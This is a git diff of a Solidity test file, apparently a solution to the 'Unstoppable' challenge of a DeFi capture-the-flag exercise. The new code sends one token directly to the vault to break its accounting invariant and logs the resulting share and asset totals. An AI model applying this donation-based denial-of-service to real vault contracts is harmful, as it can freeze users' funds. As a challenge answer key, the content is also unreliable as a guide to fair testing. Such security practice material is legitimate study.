@@ -92,10 +92,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
-        UnstoppableVaultAttacker attacker = new UnstoppableVaultAttacker(address(vault));
-        token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
-        attacker.attack();
+        token.transfer(address(vault), 1);
+        console.log("total supply convertToShares: ", vault.convertToShares(vault.totalSupply()));
+        console.log("total assets:                ", vault.totalAssets());
     }
 
     /**
